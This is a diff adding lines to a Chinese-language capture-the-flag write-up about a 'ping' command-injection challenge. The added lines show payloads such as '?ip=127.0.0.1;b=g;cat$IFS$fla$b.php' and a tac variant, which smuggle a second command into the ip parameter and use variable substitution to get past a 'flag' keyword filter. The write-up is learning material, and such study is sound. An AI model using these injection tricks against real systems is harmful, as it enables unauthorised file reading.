@@ -33,4 +33,15 @@
 ![image](https://github.com/uicciu/image/blob/main/ping5.png)
 又看不懂了 
 ![image](https://github.com/uicciu/image/blob/main/ping9.png)
-这个是源码 两相对照 发现换了好多 有了一个新方法 
+这个是源码 两相对照 发现换了好多 有了一个新方法 ---参数代替法---?ip=127.0.0.1;b=g;cat$IFS$fla$b.php
+既然flag被过滤掉了就换一个值代替他 他其中的字母
+![image](https://github.com/uicciu/image/blob/main/ping6.png)
+em 打眼一看没什么区别 打开源代码试试看
+![image](https://github.com/uicciu/image/blob/main/ping7.png)
+flag就在这里
+在查询的过程中观察到有人放出 --tac 这又是个啥（---?ip=127.0.0.1;b=g;tac$IFS$fla$b.php
+
+发现不用查看源代码 flag直接展示
+
+tac是cat函数的反写
+
